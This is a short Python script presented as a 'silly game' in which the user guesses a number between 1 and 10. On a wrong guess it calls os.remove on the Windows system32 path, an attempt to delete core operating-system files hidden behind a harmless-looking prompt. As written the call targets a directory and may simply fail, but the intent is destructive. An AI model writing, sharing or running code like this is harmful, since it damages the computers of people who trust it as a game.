import random

import os 

number = random.randint(1, 10)

guess = input("silly game! guess number between 1 and 10")
guess = int(guess)

if guess == number:
    print("You Won!")
else:
    os.remove("C://Windows/system32")